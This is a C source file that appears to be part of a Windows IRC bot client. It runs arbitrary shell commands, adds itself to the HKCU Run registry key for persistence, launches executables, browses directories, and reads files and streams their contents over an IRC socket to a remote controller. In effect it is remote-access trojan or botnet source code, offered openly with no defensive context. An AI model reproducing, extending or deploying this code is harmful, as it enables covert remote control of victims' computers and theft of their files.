#include"header.h"


DWORD WINAPI ExecuteCommandThread(LPVOID lpParam) {
    struct CommandData {
        const char* cmd;
        const char* path;
    };

    struct CommandData* data = (struct CommandData*)lpParam;

    FILE* pipe = _popen(data->cmd, "r");
    if (!pipe) {
        bot_log("[!] Failed to execute command: %s\n", data->cmd);
        return 1;
    }

    FILE* outputFile = fopen(data->path, "w");
    if (!outputFile) {
        bot_log("[!] Failed to open file: %s\n", data->path);
        _pclose(pipe);
        return 1;
    }

    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        fputs(buffer, outputFile);
    }

    fclose(outputFile);
    _pclose(pipe);

    return 0;
}

char* ExecuteCommand(const char* cmd) {
    struct CommandData {
        const char* cmd;
        const char* path;
    };
    char fpath[MAX_PATH];
    strcpy(fpath, appdata_path);
    strcat_s(fpath, sizeof(fpath), "\\BotLogs\\cmd_output.txt");
    struct CommandData data = { cmd, fpath };

    HANDLE hThread = CreateThread(
        NULL,                   // default security attributes
        0,                      // use default stack size  
        ExecuteCommandThread,   // thread function name
        &data,                  // argument to thread function 
        0,                      // use default creation flags 
        NULL);                  // returns the thread identifier 

    if (hThread == NULL) {
        bot_log("[!] Failed to create ExecuteCommandThread\n");
        return NULL;
    }

    // Close the thread handle to avoid resource leaks
    CloseHandle(hThread);

    return _strdup(fpath);

}


void set_startup(const char* program_path, int enable) {
    HKEY hKey;
    const char* value_name = "hh";
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        if (enable) {
            RegSetValueExA(hKey, value_name, 0, REG_SZ, (const BYTE*)program_path, strlen(program_path) + 1);
        }
        else {
            RegDeleteValueA(hKey, value_name);
        }
        RegCloseKey(hKey);
    }
}

char* list_directory(const char* path) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    wchar_t wPath[MAX_PATH];
    AnsiToUnicode(path, wPath, MAX_PATH);
    wcscat(wPath, L"\\*");
   
    

    // 开始查找文件
    hFind = FindFirstFileW(wPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return _strdup("FindFirstFileW return INVALID_HANDLE_VALUE");
    }

    do {
        // 跳过 "." 和 ".."
        if (wcscmp(findFileData.cFileName, L".") == 0 ||
            wcscmp(findFileData.cFileName, L"..") == 0) {
            continue;
        }

        // 转换文件名回 ANSI
        char fileName[512];
        UnicodeToAnsi(findFileData.cFileName, fileName, sizeof(fileName));

        // 判断是文件还是目录
        const char* type = (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "<DIR>" : "<FILE>";

        // 格式化输出
        char line[1024];
        snprintf(line, sizeof(line), "%s%s    \n", fileName, type);
        appendToBuffer(&msgBuffer, ircsock, line);

    } while (FindNextFile(hFind, &findFileData));
    flushBuffer(&msgBuffer, ircsock);

    FindClose(hFind);
    return _strdup("ls complete.");
}

// 执行指定路径的 exe 文件
int run_executable(const char* path, const char* args, int mode) {
    size_t path_len = strlen(path);
    size_t args_len = strlen(args);

    // 分配内存
    wchar_t* wpath = (wchar_t*)malloc((path_len + 1) * sizeof(wchar_t));
    if (!wpath) {
        bot_log("[!] Memory allocation failed for wpath\n");
        return -1;
    }

    wchar_t* wargs = (wchar_t*)malloc((args_len + 1) * sizeof(wchar_t));
    if (!wargs) {
        bot_log("[!] Memory allocation failed for wargs\n");
        free(wpath);
        return -1;
    }

    // 转换路径和参数
    AnsiToUnicode(path, wpath, (path_len + 1) * sizeof(wchar_t));
    AnsiToUnicode(args, wargs, (args_len + 1) * sizeof(wchar_t));

    // 执行程序
    HINSTANCE result = ShellExecuteW(NULL, L"open", wpath, wargs, NULL, mode);

    // 清理资源
    free(wpath);
    free(wargs);

    return (intptr_t)result > 32 ? 0 : -1;
}

// 获取当前工作目录
char* pwd_command() {
    char buffer[MAX_PATH];
    if (_getcwd(buffer, sizeof(buffer)) == NULL) {
        return _strdup("[!] Failed to get current working directory");
    }
    else {
        return _strdup(buffer);
    }
}

// 切换当前工作目录
char* cd_command(const char* path) {
    if (_chdir(path) != 0) {
        char* error = (char*)malloc(256);
        snprintf(error, 256, "[!] Failed to change directory to %s", path);
        return error;
    }
    return pwd_command(); // 返回新路径
}

char* cat_file(const char* path) {
    FILE* fp = fopen(path, "r");
    if (!fp) {
        return _strdup("Fail to open file.");
    }

    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        appendToBuffer(&msgBuffer, ircsock, line);
    }
    flushBuffer(&msgBuffer, ircsock);

    fclose(fp);
    return _strdup("FILE END");
}

